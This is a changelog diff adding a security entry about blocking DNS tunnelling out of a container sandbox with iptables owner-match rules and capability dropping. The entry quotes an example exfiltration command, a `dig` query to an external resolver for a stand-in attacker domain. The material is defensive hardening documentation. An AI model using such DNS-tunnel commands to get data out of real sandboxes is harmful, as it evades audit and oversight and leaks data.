@@ -7,6 +7,23 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+
+- **apple-container cage workload can no longer DNS-tunnel via direct
+  UDP `:53` to external resolvers.** The previous release shipped a
+  scoped in-cage dnsmasq, but a uid-1000 process could simply `dig
+  @1.1.1.1 evil.example` instead of using the local resolver —
+  uncovered by the next CTF run as a clean exfil channel with no
+  audit trail. Tighten the cage's iptables `OUTPUT` chain: allow
+  loopback UDP `:53` first (so the workload's regular
+  `getent`/`gethostbyname` lookups reach 127.0.0.1), then DROP any
+  UDP `:53` packet not originated by the in-cage dnsmasq uid
+  (`acdns`, uid 201) via the `xt_owner` module. Cage exec `--user 0`
+  still can't bypass — the exec wrapper drops `CAP_NET_ADMIN` before
+  exec, so root can't flush iptables. Also tightens the existing
+  cage→apple-host-gateway block to DROP all UDP (not just non-`:53`)
+  now that DNS has its own loopback path.
+
 ## [0.22.11] - 2026-05-28
 
 ### Security
